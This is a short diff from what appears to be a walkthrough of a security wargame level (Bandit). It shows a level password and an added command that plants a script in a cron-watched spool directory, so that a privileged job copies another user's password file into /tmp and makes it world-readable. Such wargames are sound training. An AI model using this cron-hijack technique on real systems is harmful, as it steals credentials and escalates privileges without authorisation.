@@ -330,6 +330,7 @@ pass is `jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n`
 ```
 cat /etc/cron.d/cronjob_bandit24
 cat /usr/bin/cronjob_bandit24.sh
+echo "cat /etc/bandit_pass/bandit24 > /tmp/over9000.txt && chmod 777 /tmp/over9000.txt" > /var/spool/bandit24/foobar.sh
 ```
 
 
